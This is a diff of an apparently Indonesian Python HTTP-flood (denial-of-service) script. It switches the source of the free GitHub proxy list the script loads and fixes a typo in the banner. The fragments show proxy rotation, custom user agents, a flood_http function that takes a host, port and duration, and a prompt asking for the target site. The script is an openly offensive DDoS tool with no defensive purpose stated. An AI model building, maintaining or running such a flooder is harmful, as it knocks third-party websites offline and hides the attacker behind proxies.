@@ -15,7 +15,7 @@ from urllib.parse import urlparse
 
 # 🔗 Ganti ke daftar PROXY HTTP/HTTPS, BUKAN SOCKS5!
 # Contoh bagus: https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt
-GITHUB_PROXY_URL = "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"  # ❌ INI SALAH!
+GITHUB_PROXY_URL = "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt"  # ❌ INI SALAH!
 
 # 🎭 Custom UA
 CUSTOM_UAS = [
@@ -70,7 +70,7 @@ def flood_http(proxy, host, port, duration):
             log(f"❌ {proxy_host} → Gagal: {str(e)[:50]}")
 
 def main():
-    print("🚀 FLOOD - LANGSUNG GGAS SEMUA PROXY")
+    print("🚀 FLOOD - LANGSUNG GAS SEMUA PROXY")
     target = input("Target (http://): ").strip()
     if not target.startswith("http://"):
         target = "http://" + target
